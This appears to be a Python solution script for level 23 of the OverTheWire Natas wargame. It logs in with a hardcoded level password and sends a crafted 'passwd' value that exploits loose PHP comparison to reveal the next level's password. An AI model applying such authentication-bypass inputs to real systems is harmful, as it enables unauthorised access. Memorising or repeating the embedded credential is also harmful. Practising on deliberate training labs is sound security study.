import requests
import re

username = 'natas23'
password = 'qjA8cOoKFTzJhtV0Fzvt92fgvxVnVRBj'

# append before cannot after
url = 'http://%s.natas.labs.overthewire.org/?passwd=10111iloveyou' % username

with open('natas23.html', 'w+') as out:
    session = requests.Session()
    res = session.get(url, auth=(username, password))
    content = res.text
    out.write(content)
    flag = re.findall('Password: (.+?)</pre>', content)[0]
    print(flag)
